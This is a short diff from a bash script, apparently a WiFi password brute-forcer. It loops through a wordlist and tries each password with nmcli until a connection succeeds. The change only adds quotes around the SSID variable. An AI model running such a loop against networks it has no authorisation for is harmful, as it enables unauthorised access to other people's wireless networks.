@@ -14,7 +14,7 @@ function bruteforce {
 
 for password in $(cat $wordlist);
 do
-trytoconnect=$(nmcli --wait 3 dev wifi connect $ssid password $password &> /dev/null)
+trytoconnect=$(nmcli --wait 3 dev wifi connect "$ssid" password $password &> /dev/null)
 result=$?
 if [ $result = 0 ];
 then
